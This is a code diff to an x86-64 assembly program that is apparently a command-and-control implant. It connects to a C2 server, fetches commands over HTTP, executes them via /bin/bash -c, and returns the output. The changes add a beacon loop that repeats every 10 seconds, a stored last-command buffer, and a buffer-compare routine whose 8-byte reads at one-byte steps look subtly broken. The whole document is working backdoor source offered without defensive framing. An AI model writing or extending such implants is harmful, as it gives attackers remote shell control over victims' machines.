@@ -16,6 +16,7 @@ section .data
     bash_path db "/bin/bash", 0x0           ; Path to shell
     bash_cmd_str db "-c", 0x0               ; Bash command string option
     cmd_buffer_length dq 0x0                ; Length of the cmd_buffer
+    cmd_buffer_old_length dq 0x0            ; Length of the cmd_buffer_old
     tx_buffer_length dq 0x0                 ; Length of the tx_buffer
     status_data dq 0x0                      ; Status of wait4 syscall
 
@@ -23,6 +24,7 @@ section .bss
     rx_buffer resb 0x400                    ; Receiving buffer from the server, 1KB max
     tx_buffer resb 0x400                    ; Transmitting buffer to the server, 1KB max
     cmd_buffer resb 0x100                   ; Buffer for received command
+    cmd_buffer_old resb 0x100               ; Buffer to store last command
     argv resq 0x4                           ; Argument values for execve call
     pipe_fd resd 0x2                        ; pipe file descriptors for IPC
 
@@ -35,13 +37,14 @@ section .text
     global fn_write_socket
     global fn_get_command
     global fn_poll_socket
-    global fn_sleep_ns
+    global fn_sleep
     global fn_clean_buffer
     global fn_parse_command
     global fn_exec_cmd
     global fn_buffer_copy
     global fn_make_pipe
-    
+    global fn_buffer_cmp
+
 ; Function to exit
 fn_error_exit:
     ; Print error message
@@ -83,6 +86,37 @@ fn_dbg_print_cmd_buffer:
     pop rbp
     ret
 
+; Function to compare two buffer
+; Parameters:
+;   rdi - address of buff1
+;   rsi - address of buff2
+;   rdx - buffer length of buff1
+; Return values:
+;   rax - 0 if equal, 1 if not equal
+fn_buffer_cmp:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x8                ; Stackframe
+
+    xor rcx, rcx
+.loop:
+    mov rax, [rdi+rcx]
+    cmp [rsi+rcx], rax
+    jne .not_equal
+    inc rcx
+    cmp rcx, rdx
+    jl .loop
+    je .equal
+
+.equal:
+    xor rax, rax
+    jmp .return
+.not_equal:
+    mov rax, 0x1
+.return:
+    mov rsp, rbp
+    pop rbp
+    ret
 
 ; Debug function to print the rx_buffer
 fn_dbg_print_rx_buffer:
@@ -147,9 +181,9 @@ fn_clean_buffer:
 ; Function to copy a buffer to another buffer
 ; Make sure the destination buffer is large enough to contain source buffer
 ; Parameters:
-; rdi - address to buffer 1, destination buffer
-; rsi - address to buffer 2, source buffer
-; rdx - length of buffer 2
+;   rdi - address to buffer 1, destination buffer
+;   rsi - address to buffer 2, source buffer
+;   rdx - length of buffer 1
 fn_buffer_copy:
     push rbp
     mov rbp, rsp
@@ -169,8 +203,8 @@ fn_buffer_copy:
 
 ; Function to create a pipe for child process
 ; Return values:
-; pipe_fd[0] - reading, parent process end
-; pipe_fd[1] - writing, child process end
+;   pipe_fd[0] - reading, parent process end
+;   pipe_fd[1] - writing, child process end
 fn_make_pipe:
     push rbp
     mov rbp, rsp
@@ -236,6 +270,8 @@ fn_exec_cmd:
 
     mov rdx, qword [rsp+8]      ; Copy number of bytes available from stack into rdx
 
+    mov [tx_buffer_length], rdx
+
     ; Read that much bytes
     xor rax, rax                ; read syscall
     mov edi, dword [pipe_fd]    ; pipe_fd[0]
@@ -294,7 +330,7 @@ fn_parse_command:
     mov rbp, rsp
     sub rsp, 0x8                ; Stackframe
 
-    call fn_sleep_ns
+    call fn_sleep
     ; Trick is to find \r\n\r\n in http command
     ; Iterate through the whole buffer to find that pattern
     xor rax, rax                ; The pattern finder
@@ -359,7 +395,7 @@ fn_parse_command:
 
 ; Function to sleep to avoid synchronization problems
 ; Default time is 50ms
-fn_sleep_ns:
+fn_sleep:
     push rbp
     mov rbp, rsp
     sub rsp, 0x8                ; Stackframe
@@ -426,9 +462,9 @@ fn_poll_socket:
 ; Function to read the raw data of the C2 server
 ; Reads from the socket file descriptor stored in memory and stores inside rx_buffer
 ; Parameters:
-; rax - number of bytes to read
+;   rax - number of bytes to read
 ; Return values:
-; [rx_buffer] - buffer that has been received
+;   [rx_buffer] - buffer that has been received
 fn_read_socket:
     push rbp
     mov rbp, rsp
@@ -450,8 +486,8 @@ fn_read_socket:
 ; Function to write data on the socket to the C2 server
 ; Writes to the socket file descriptor stored in memory in tx_buffer
 ; Parameters: 
-; rsi - address of the string to be written
-; rdx - length of the buffer              
+;   rsi - address of the string to be written
+;   rdx - length of the buffer              
 fn_write_socket:
     push rbp
     mov rbp, rsp
@@ -529,7 +565,7 @@ fn_get_command:
     call fn_write_socket
 
     ; Wait for server to process
-    call fn_sleep_ns
+    call fn_sleep
 
     ; Poll server for data
     call fn_poll_socket
@@ -555,6 +591,7 @@ _start:
     ; Connection to C2 server
     call fn_connect_client
 
+.loop:
     ; Get command from server
     call fn_get_command
 
@@ -563,7 +600,21 @@ _start:
 
     ; Execute command in bash
     call fn_exec_cmd
-    call fn_dbg_print_tx_buffer
+    ;call fn_dbg_print_tx_buffer
+
+    ; Store command into old command buffer, can compare afterwards
+    lea rdi, [cmd_buffer_old]
+    lea rsi, [cmd_buffer]
+    mov rdx, qword [cmd_buffer_length]
+    call fn_buffer_copy
+    mov rax, [cmd_buffer_length]        ; Copy buffer length
+    mov [cmd_buffer_old_length], rax
+
+    mov qword [sleep_time], 0xa         ; Sleep 10 seconds
+    call fn_sleep
+    mov qword [sleep_time], 0x0 
+    jmp .loop
+
     ; Exit the program
     mov rax, 0x3c               ; exit syscall
     mov rdi, 0x0
